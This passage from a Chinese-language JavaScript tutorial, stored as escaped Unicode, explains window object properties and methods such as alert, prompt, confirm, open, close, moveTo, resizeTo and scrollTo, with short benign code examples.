\u6570\u636e\uff0c\u8be6\u89c1\u300aStorage \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 window.sessionStorage \uff1a\u6307\u5411\u672c\u5730\u50a8\u5b58\u7684 sessionStorage \u6570\u636e\uff0c\u8be6\u89c1\u300aStorage \u63a5\u53e3\u300b\u4e00\u7ae0\u3002 window.console \uff1a\u6307\u5411 console \u5bf9\u8c61\uff0c\u7528\u4e8e\u64cd\u4f5c\u63a7\u5236\u53f0\uff0c\u8be6\u89c1\u300aconsole \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.screen \uff1a\u6307\u5411 Screen \u5bf9\u8c61\uff0c\u8868\u793a\u5c4f\u5e55\u4fe1\u606f\uff0c\u8be6\u89c1\u300aScreen \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.isSecureContext \u00b6 window.isSecureContext \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u7a97\u53e3\u662f\u5426\u5904\u5728\u52a0\u5bc6\u73af\u5883\u3002\u5982\u679c\u662f HTTPS \u534f\u8bae\uff0c\u5c31\u662f true \uff0c\u5426\u5219\u5c31\u662f false \u3002 window \u5bf9\u8c61\u7684\u65b9\u6cd5 \u00b6 window.alert()\uff0cwindow.prompt()\uff0cwindow.confirm() \u00b6 window.alert() \u3001 window.prompt() \u3001 window.confirm() \u90fd\u662f\u6d4f\u89c8\u5668\u4e0e\u7528\u6237\u4e92\u52a8\u7684\u5168\u5c40\u65b9\u6cd5\u3002\u5b83\u4eec\u4f1a\u5f39\u51fa\u4e0d\u540c\u7684\u5bf9\u8bdd\u6846\uff0c\u8981\u6c42\u7528\u6237\u505a\u51fa\u56de\u5e94\u3002\u6ce8\u610f\uff0c\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u90fd\u662f\u6d4f\u89c8\u5668\u7edf\u4e00\u89c4\u5b9a\u7684\u5f0f\u6837\uff0c\u65e0\u6cd5\u5b9a\u5236\u3002 \uff081\uff09window.alert() window.alert() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u53ea\u6709\u4e00\u4e2a\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u5f80\u5f80\u7528\u6765\u901a\u77e5\u7528\u6237\u67d0\u4e9b\u4fe1\u606f\u3002 1 window . alert ( 'Hello World' ); \u7528\u6237\u53ea\u6709\u70b9\u51fb\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u5bf9\u8bdd\u6846\u624d\u4f1a\u6d88\u5931\u3002\u5bf9\u8bdd\u6846\u5f39\u51fa\u671f\u95f4\uff0c\u6d4f\u89c8\u5668\u7a97\u53e3\u5904\u4e8e\u51bb\u7ed3\u72b6\u6001\uff0c\u5982\u679c\u4e0d\u70b9\u201c\u786e\u5b9a\u201d\u6309\u94ae\uff0c\u7528\u6237\u4ec0\u4e48\u4e5f\u5e72\u4e0d\u4e86\u3002 window.alert() \u65b9\u6cd5\u7684\u53c2\u6570\u53ea\u80fd\u662f\u5b57\u7b26\u4e32\uff0c\u6ca1\u6cd5\u4f7f\u7528 CSS \u6837\u5f0f\uff0c\u4f46\u662f\u53ef\u4ee5\u7528 \\n \u6307\u5b9a\u6362\u884c\u3002 1 alert ( '\u672c\u6761\u63d0\u793a\\n\u5206\u6210\u4e24\u884c' ); \uff082\uff09window.prompt() window.prompt() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u63d0\u793a\u6587\u5b57\u7684\u4e0b\u65b9\uff0c\u8fd8\u6709\u4e00\u4e2a\u8f93\u5165\u6846\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u5e76\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u4e24\u4e2a\u6309\u94ae\u3002\u5b83\u5f80\u5f80\u7528\u6765\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u3002 1 var result = prompt ( '\u60a8\u7684\u5e74\u9f84\uff1f' , 25 ) \u4e0a\u9762\u4ee3\u7801\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u6587\u5b57\u63d0\u793a\u4e3a\u201c\u60a8\u7684\u5e74\u9f84\uff1f\u201d\uff0c\u8981\u6c42\u7528\u6237\u5728\u5bf9\u8bdd\u6846\u4e2d\u8f93\u5165\u81ea\u5df1\u7684\u5e74\u9f84\uff08\u9ed8\u8ba4\u663e\u793a25\uff09\u3002\u7528\u6237\u586b\u5165\u7684\u503c\uff0c\u4f1a\u4f5c\u4e3a\u8fd4\u56de\u503c\u5b58\u5165\u53d8\u91cf result \u3002 window.prompt() \u7684\u8fd4\u56de\u503c\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u53ef\u80fd\u662f\u5b57\u7b26\u4e32\uff08\u6709\u53ef\u80fd\u662f\u7a7a\u5b57\u7b26\u4e32\uff09\uff0c\u4e5f\u6709\u53ef\u80fd\u662f null \u3002\u5177\u4f53\u5206\u6210\u4e09\u79cd\u60c5\u51b5\u3002 \u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u5e76\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u5219\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u5c31\u662f\u8fd4\u56de\u503c\u3002 \u7528\u6237\u6ca1\u6709\u8f93\u5165\u4fe1\u606f\uff0c\u76f4\u63a5\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u5219\u8f93\u5165\u6846\u7684\u9ed8\u8ba4\u503c\u5c31\u662f\u8fd4\u56de\u503c\u3002 \u7528\u6237\u70b9\u51fb\u4e86\u201c\u53d6\u6d88\u201d\uff08\u6216\u8005\u6309\u4e86 ESC \u6309\u94ae\uff09\uff0c\u5219\u8fd4\u56de\u503c\u662f null \u3002 window.prompt() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4f46\u662f\u6700\u597d\u603b\u662f\u63d0\u4f9b\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u4e3a\u8f93\u5165\u6846\u7684\u9ed8\u8ba4\u503c\u3002 \uff083\uff09window.confirm() window.confirm() \u65b9\u6cd5\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\uff0c\u9664\u4e86\u63d0\u793a\u4fe1\u606f\u4e4b\u5916\uff0c\u53ea\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u4e24\u4e2a\u6309\u94ae\uff0c\u5f80\u5f80\u7528\u6765\u5f81\u8be2\u7528\u6237\u662f\u5426\u540c\u610f\u3002 1 var result = confirm ( '\u4f60\u6700\u8fd1\u597d\u5417\uff1f' ); \u4e0a\u9762\u4ee3\u7801\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u4e0a\u9762\u53ea\u6709\u4e00\u884c\u6587\u5b57\u201c\u4f60\u6700\u8fd1\u597d\u5417\uff1f\u201d\uff0c\u7528\u6237\u9009\u62e9\u70b9\u51fb\u201c\u786e\u5b9a\u201d\u6216\u201c\u53d6\u6d88\u201d\u3002 confirm \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u786e\u5b9a\u201d\uff0c\u8fd4\u56de true \uff1b\u5982\u679c\u7528\u6237\u70b9\u51fb\u201c\u53d6\u6d88\u201d\uff0c\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 6 var okay = confirm ( 'Please confirm this message.' ); if ( okay ) { // \u7528\u6237\u6309\u4e0b\u201c\u786e\u5b9a\u201d } else { // \u7528\u6237\u6309\u4e0b\u201c\u53d6\u6d88\u201d } confirm \u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u7528\u6237\u79bb\u5f00\u5f53\u524d\u9875\u9762\u65f6\uff0c\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u95ee\u7528\u6237\u662f\u5426\u771f\u7684\u8981\u79bb\u5f00\u3002 1 2 3 window . onunload = function () { return window . confirm ( '\u4f60\u786e\u5b9a\u8981\u79bb\u5f00\u5f53\u9762\u9875\u9762\u5417\uff1f' ); } \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u5177\u6709\u5835\u585e\u6548\u5e94\uff0c\u4e00\u65e6\u5f39\u51fa\u5bf9\u8bdd\u6846\uff0c\u6574\u4e2a\u9875\u9762\u5c31\u662f\u6682\u505c\u6267\u884c\uff0c\u7b49\u5f85\u7528\u6237\u505a\u51fa\u53cd\u5e94\u3002 window.open(), window.close()\uff0cwindow.stop() \u00b6 \uff081\uff09window.open() window.open \u65b9\u6cd5\u7528\u4e8e\u65b0\u5efa\u53e6\u4e00\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\uff0c\u7c7b\u4f3c\u4e8e\u6d4f\u89c8\u5668\u83dc\u5355\u7684\u65b0\u5efa\u7a97\u53e3\u9009\u9879\u3002\u5b83\u4f1a\u8fd4\u56de\u65b0\u7a97\u53e3\u7684\u5f15\u7528\uff0c\u5982\u679c\u65e0\u6cd5\u65b0\u5efa\u7a97\u53e3\uff0c\u5219\u8fd4\u56de null \u3002 1 var popup = window . open ( 'somefile.html' ); \u4e0a\u9762\u4ee3\u7801\u4f1a\u8ba9\u6d4f\u89c8\u5668\u5f39\u51fa\u4e00\u4e2a\u65b0\u5efa\u7a97\u53e3\uff0c\u7f51\u5740\u662f\u5f53\u524d\u57df\u540d\u4e0b\u7684 somefile.html \u3002 open \u65b9\u6cd5\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 1 window . open ( url , windowName , [ windowFeatures ]) url \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u7f51\u5740\u3002\u5982\u679c\u7701\u7565\uff0c\u9ed8\u8ba4\u7f51\u5740\u5c31\u662f about:blank \u3002 windowName \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u540d\u5b57\u3002\u5982\u679c\u8be5\u540d\u5b57\u7684\u7a97\u53e3\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u5360\u7528\u8be5\u7a97\u53e3\uff0c\u4e0d\u518d\u65b0\u5efa\u7a97\u53e3\u3002\u5982\u679c\u7701\u7565\uff0c\u5c31\u9ed8\u8ba4\u4f7f\u7528 _blank \uff0c\u8868\u793a\u65b0\u5efa\u4e00\u4e2a\u6ca1\u6709\u540d\u5b57\u7684\u7a97\u53e3\u3002\u53e6\u5916\u8fd8\u6709\u51e0\u4e2a\u9884\u8bbe\u503c\uff0c _self \u8868\u793a\u5f53\u524d\u7a97\u53e3\uff0c _top \u8868\u793a\u9876\u5c42\u7a97\u53e3\uff0c _parent \u8868\u793a\u4e0a\u4e00\u5c42\u7a97\u53e3\u3002 windowFeatures \uff1a\u5b57\u7b26\u4e32\uff0c\u5185\u5bb9\u4e3a\u9017\u53f7\u5206\u9694\u7684\u952e\u503c\u5bf9\uff08\u8be6\u89c1\u4e0b\u6587\uff09\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u53c2\u6570\uff0c\u6bd4\u5982\u6709\u6ca1\u6709\u63d0\u793a\u680f\u3001\u5de5\u5177\u6761\u7b49\u7b49\u3002\u5982\u679c\u7701\u7565\uff0c\u5219\u9ed8\u8ba4\u6253\u5f00\u4e00\u4e2a\u5b8c\u6574 UI \u7684\u65b0\u7a97\u53e3\u3002\u5982\u679c\u65b0\u5efa\u7684\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u7a97\u53e3\uff0c\u5219\u8be5\u53c2\u6570\u4e0d\u8d77\u4f5c\u7528\uff0c\u6d4f\u89c8\u5668\u6cbf\u7528\u4ee5\u524d\u7a97\u53e3\u7684\u53c2\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var popup = window . open ( 'somepage.html' , 'DefinitionsWindows' , 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes' ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6253\u5f00\u7684\u65b0\u7a97\u53e3\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u90fd\u4e3a200\u50cf\u7d20\uff0c\u6ca1\u6709\u5730\u5740\u680f\uff0c\u4f46\u6709\u72b6\u6001\u680f\u548c\u6eda\u52a8\u6761\uff0c\u5141\u8bb8\u7528\u6237\u8c03\u6574\u5927\u5c0f\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u8bbe\u5b9a\u5982\u4e0b\u5c5e\u6027\u3002 left\uff1a\u65b0\u7a97\u53e3\u8ddd\u79bb\u5c4f\u5e55\u6700\u5de6\u8fb9\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6ce8\u610f\uff0c\u65b0\u7a97\u53e3\u5fc5\u987b\u662f\u53ef\u89c1\u7684\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u5728\u5c4f\u5e55\u4ee5\u5916\u7684\u4f4d\u7f6e\u3002 top\uff1a\u65b0\u7a97\u53e3\u8ddd\u79bb\u5c4f\u5e55\u6700\u9876\u90e8\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 height\uff1a\u65b0\u7a97\u53e3\u5185\u5bb9\u533a\u57df\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 width\uff1a\u65b0\u7a97\u53e3\u5185\u5bb9\u533a\u57df\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 outerHeight\uff1a\u6574\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 outerWidth\uff1a\u6574\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5f97\u5c0f\u4e8e100\u3002 menubar\uff1a\u662f\u5426\u663e\u793a\u83dc\u5355\u680f\u3002 toolbar\uff1a\u662f\u5426\u663e\u793a\u5de5\u5177\u680f\u3002 location\uff1a\u662f\u5426\u663e\u793a\u5730\u5740\u680f\u3002 personalbar\uff1a\u662f\u5426\u663e\u793a\u7528\u6237\u81ea\u5df1\u5b89\u88c5\u7684\u5de5\u5177\u680f\u3002 status\uff1a\u662f\u5426\u663e\u793a\u72b6\u6001\u680f\u3002 dependent\uff1a\u662f\u5426\u4f9d\u8d56\u7236\u7a97\u53e3\u3002\u5982\u679c\u4f9d\u8d56\uff0c\u90a3\u4e48\u7236\u7a97\u53e3\u6700\u5c0f\u5316\uff0c\u8be5\u7a97\u53e3\u4e5f\u6700\u5c0f\u5316\uff1b\u7236\u7a97\u53e3\u5173\u95ed\uff0c\u8be5\u7a97\u53e3\u4e5f\u5173\u95ed\u3002 minimizable\uff1a\u662f\u5426\u6709\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u524d\u63d0\u662f dialog=yes \u3002 noopener\uff1a\u65b0\u7a97\u53e3\u5c06\u4e0e\u7236\u7a97\u53e3\u5207\u65ad\u8054\u7cfb\uff0c\u5373\u65b0\u7a97\u53e3\u7684 window.opener \u5c5e\u6027\u8fd4\u56de null \uff0c\u7236\u7a97\u53e3\u7684 window.open() \u65b9\u6cd5\u4e5f\u8fd4\u56de null \u3002 resizable\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u53ef\u4ee5\u8c03\u8282\u5927\u5c0f\u3002 scrollbars\uff1a\u662f\u5426\u5141\u8bb8\u65b0\u7a97\u53e3\u51fa\u73b0\u6eda\u52a8\u6761\u3002 dialog\uff1a\u65b0\u7a97\u53e3\u6807\u9898\u680f\u662f\u5426\u51fa\u73b0\u6700\u5927\u5316\u3001\u6700\u5c0f\u5316\u3001\u6062\u590d\u539f\u59cb\u5927\u5c0f\u7684\u63a7\u4ef6\u3002 titlebar\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u663e\u793a\u6807\u9898\u680f\u3002 alwaysRaised\uff1a\u662f\u5426\u663e\u793a\u5728\u6240\u6709\u7a97\u53e3\u7684\u9876\u90e8\u3002 alwaysLowered\uff1a\u662f\u5426\u663e\u793a\u5728\u7236\u7a97\u53e3\u7684\u5e95\u4e0b\u3002 close\uff1a\u65b0\u7a97\u53e3\u662f\u5426\u663e\u793a\u5173\u95ed\u6309\u94ae\u3002 \u5bf9\u4e8e\u90a3\u4e9b\u53ef\u4ee5\u6253\u5f00\u548c\u5173\u95ed\u7684\u5c5e\u6027\uff0c\u8bbe\u4e3a yes \u6216 1 \u6216\u4e0d\u8bbe\u4efb\u4f55\u503c\u5c31\u8868\u793a\u6253\u5f00\uff0c\u6bd4\u5982 status=yes \u3001 status=1 \u3001 status \u90fd\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002\u5982\u679c\u60f3\u8bbe\u4e3a\u5173\u95ed\uff0c\u4e0d\u7528\u5199 no \uff0c\u800c\u662f\u76f4\u63a5\u7701\u7565\u8fd9\u4e2a\u5c5e\u6027\u5373\u53ef\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5728\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e2d\u8bbe\u7f6e\u4e86\u4e00\u90e8\u5206\u5c5e\u6027\uff0c\u5176\u4ed6\u6ca1\u6709\u88ab\u8bbe\u7f6e\u7684 yes/no \u5c5e\u6027\u90fd\u4f1a\u88ab\u8bbe\u6210 no \uff0c\u53ea\u6709 titlebar \u548c\u5173\u95ed\u6309\u94ae\u9664\u5916\uff08\u5b83\u4eec\u7684\u503c\u9ed8\u8ba4\u4e3a yes \uff09\u3002 \u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c5e\u6027\u540d\u4e0e\u5c5e\u6027\u503c\u4e4b\u95f4\u7528\u7b49\u53f7\u8fde\u63a5\uff0c\u5c5e\u6027\u4e0e\u5c5e\u6027\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002 1 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes' \u53e6\u5916\uff0c open() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u867d\u7136\u53ef\u4ee5\u6307\u5b9a\u5df2\u7ecf\u5b58\u5728\u7684\u7a97\u53e3\uff0c\u4f46\u662f\u4e0d\u7b49\u4e8e\u53ef\u4ee5\u4efb\u610f\u63a7\u5236\u5176\u4ed6\u7a97\u53e3\u3002\u4e3a\u4e86\u9632\u6b62\u88ab\u4e0d\u76f8\u5e72\u7684\u7a97\u53e3\u63a7\u5236\uff0c\u6d4f\u89c8\u5668\u53ea\u6709\u5728\u4e24\u4e2a\u7a97\u53e3\u540c\u6e90\uff0c\u6216\u8005\u76ee\u6807\u7a97\u53e3\u88ab\u5f53\u524d\u7f51\u9875\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u5141\u8bb8 open \u65b9\u6cd5\u6307\u5411\u8be5\u7a97\u53e3\u3002 window.open \u65b9\u6cd5\u8fd4\u56de\u65b0\u7a97\u53e3\u7684\u5f15\u7528\u3002 1 2 var windowB = window . open ( 'windowB.html' , 'WindowB' ); windowB . window . name // \"WindowB\" \u6ce8\u610f\uff0c\u5982\u679c\u65b0\u7a97\u53e3\u548c\u7236\u7a97\u53e3\u4e0d\u662f\u540c\u6e90\u7684\uff08\u5373\u4e0d\u5728\u540c\u4e00\u4e2a\u57df\uff09\uff0c\u5b83\u4eec\u5f7c\u6b64\u4e0d\u80fd\u83b7\u53d6\u5bf9\u65b9\u7a97\u53e3\u5bf9\u8c61\u7684\u5185\u90e8\u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 var w = window . open (); console . log ( '\u5df2\u7ecf\u6253\u5f00\u65b0\u7a97\u53e3' ); w . location = 'http://example.com' ; \u4e0a\u9762\u4ee3\u7801\u5148\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u7136\u540e\u5728\u8be5\u7a97\u53e3\u5f39\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u518d\u5c06\u7f51\u5740\u5bfc\u5411 example.com \u3002 \u7531\u4e8e open \u8fd9\u4e2a\u65b9\u6cd5\u5f88\u5bb9\u6613\u88ab\u6ee5\u7528\uff0c\u8bb8\u591a\u6d4f\u89c8\u5668\u9ed8\u8ba4\u90fd\u4e0d\u5141\u8bb8\u811a\u672c\u81ea\u52a8\u65b0\u5efa\u7a97\u53e3\u3002\u53ea\u5141\u8bb8\u5728\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u6216\u6309\u94ae\u65f6\uff0c\u811a\u672c\u505a\u51fa\u53cd\u5e94\uff0c\u5f39\u51fa\u65b0\u7a97\u53e3\u3002\u56e0\u6b64\uff0c\u6709\u5fc5\u8981\u68c0\u67e5\u4e00\u4e0b\u6253\u5f00\u65b0\u7a97\u53e3\u662f\u5426\u6210\u529f\u3002 1 2 3 4 var popup = window . open (); if ( popup === null ) { // \u65b0\u5efa\u7a97\u53e3\u5931\u8d25 } \uff082\uff09window.close() window.close \u65b9\u6cd5\u7528\u4e8e\u5173\u95ed\u5f53\u524d\u7a97\u53e3\uff0c\u4e00\u822c\u53ea\u7528\u6765\u5173\u95ed window.open \u65b9\u6cd5\u65b0\u5efa\u7684\u7a97\u53e3\u3002 1 popup . close () \u8be5\u65b9\u6cd5\u53ea\u5bf9\u9876\u5c42\u7a97\u53e3\u6709\u6548\uff0c iframe \u6846\u67b6\u4e4b\u4e2d\u7684\u7a97\u53e3\u4f7f\u7528\u8be5\u65b9\u6cd5\u65e0\u6548\u3002 \uff083\uff09window.stop() window.stop() \u65b9\u6cd5\u5b8c\u5168\u7b49\u540c\u4e8e\u5355\u51fb\u6d4f\u89c8\u5668\u7684\u505c\u6b62\u6309\u94ae\uff0c\u4f1a\u505c\u6b62\u52a0\u8f7d\u56fe\u50cf\u3001\u89c6\u9891\u7b49\u6b63\u5728\u6216\u7b49\u5f85\u52a0\u8f7d\u7684\u5bf9\u8c61\u3002 1 window . stop () window.moveTo()\uff0cwindow.moveBy() \u00b6 window.moveTo() \u65b9\u6cd5\u7528\u4e8e\u79fb\u52a8\u6d4f\u89c8\u5668\u7a97\u53e3\u5230\u6307\u5b9a\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u7a97\u53e3\u5de6\u4e0a\u89d2\u8ddd\u79bb\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5782\u76f4\u8ddd\u79bb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002 1 window . moveTo ( 100 , 200 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u7a97\u53e3\u79fb\u52a8\u5230\u5c4f\u5e55 (100, 200) \u7684\u4f4d\u7f6e\u3002 window.moveBy() \u65b9\u6cd5\u5c06\u7a97\u53e3\u79fb\u52a8\u5230\u4e00\u4e2a\u76f8\u5bf9\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u7a97\u53e3\u5de6\u4e0a\u89d2\u5411\u53f3\u79fb\u52a8\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5411\u4e0b\u79fb\u52a8\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002 1 window . moveBy ( 25 , 50 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u7a97\u53e3\u5411\u53f3\u79fb\u52a825\u50cf\u7d20\u3001\u5411\u4e0b\u79fb\u52a850\u50cf\u7d20\u3002 \u4e3a\u4e86\u9632\u6b62\u6709\u4eba\u6ee5\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff0c\u968f\u610f\u79fb\u52a8\u7528\u6237\u7684\u7a97\u53e3\uff0c\u76ee\u524d\u53ea\u6709\u4e00\u79cd\u60c5\u51b5\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u7528\u811a\u672c\u79fb\u52a8\u7a97\u53e3\uff1a\u8be5\u7a97\u53e3\u662f\u7528 window.open() \u65b9\u6cd5\u65b0\u5efa\u7684\uff0c\u5e76\u4e14\u7a97\u53e3\u91cc\u53ea\u6709\u5b83\u4e00\u4e2a Tab \u9875\u3002\u9664\u6b64\u4ee5\u5916\u7684\u60c5\u51b5\uff0c\u4f7f\u7528\u4e0a\u9762\u4e24\u4e2a\u65b9\u6cd5\u90fd\u662f\u65e0\u6548\u7684\u3002 window.resizeTo()\uff0cwindow.resizeBy() \u00b6 window.resizeTo() \u65b9\u6cd5\u7528\u4e8e\u7f29\u653e\u7a97\u53e3\u5230\u6307\u5b9a\u5927\u5c0f\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u7f29\u653e\u540e\u7684\u7a97\u53e3\u5bbd\u5ea6\uff08 outerWidth \u5c5e\u6027\uff0c\u5305\u542b\u6eda\u52a8\u6761\u3001\u6807\u9898\u680f\u7b49\u7b49\uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f\u7f29\u653e\u540e\u7684\u7a97\u53e3\u9ad8\u5ea6\uff08 outerHeight \u5c5e\u6027\uff09\u3002 1 2 3 4 window . resizeTo ( window . screen . availWidth / 2 , window . screen . availHeight / 2 ) \u4e0a\u9762\u4ee3\u7801\u5c06\u5f53\u524d\u7a97\u53e3\u7f29\u653e\u5230\uff0c\u5c4f\u5e55\u53ef\u7528\u533a\u57df\u7684\u4e00\u534a\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 window.resizeBy() \u65b9\u6cd5\u7528\u4e8e\u7f29\u653e\u7a97\u53e3\u3002\u5b83\u4e0e window.resizeTo() \u7684\u533a\u522b\u662f\uff0c\u5b83\u6309\u7167\u76f8\u5bf9\u7684\u91cf\u7f29\u653e\uff0c window.resizeTo() \u9700\u8981\u7ed9\u51fa\u7f29\u653e\u540e\u7684\u7edd\u5bf9\u5927\u5c0f\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6c34\u5e73\u7f29\u653e\u7684\u91cf\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5782\u76f4\u7f29\u653e\u7684\u91cf\uff0c\u5355\u4f4d\u90fd\u662f\u50cf\u7d20\u3002 1 window . resizeBy ( - 200 , - 200 ) \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\uff0c\u90fd\u7f29\u5c0f200\u50cf\u7d20\u3002 window.scrollTo()\uff0cwindow.scroll()\uff0cwindow.scrollBy() \u00b6 window.scrollTo \u65b9\u6cd5\u7528\u4e8e\u5c06\u6587\u6863\u6eda\u52a8\u5230\u6307\u5b9a\u4f4d\u7f6e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6eda\u52a8\u540e\u4f4d\u4e8e\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u9875\u9762\u5750\u6807\u3002 1 window . scrollTo ( x - coord , y - coord ) \u5b83\u4e5f\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002 1 window . scrollTo ( options ) \u914d\u7f6e\u5bf9\u8c61 options \u6709\u4e09\u4e2a\u5c5e\u6027\u3002 top \uff1a\u6eda\u52a8\u540e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u5750\u6807\uff0c\u5373 y \u5750\u6807\u3002 left \uff1a\u6eda\u52a8\u540e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff0c\u5373 x \u5750\u6807\u3002 behavior \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6eda\u52a8\u7684\u65b9\u5f0f\uff0c\u6709\u4e09\u4e2a\u53ef\u80fd\u503c\uff08 smooth \u3001 instant \u3001 auto \uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a auto \u3002 1 2 3 4 window . scrollTo ({ top : 1000 , behavior : 'smooth' }); window.scroll() \u65b9\u6cd5\u662f window.scrollTo() \u65b9\u6cd5\u7684\u522b\u540d\u3002 window.scrollBy() 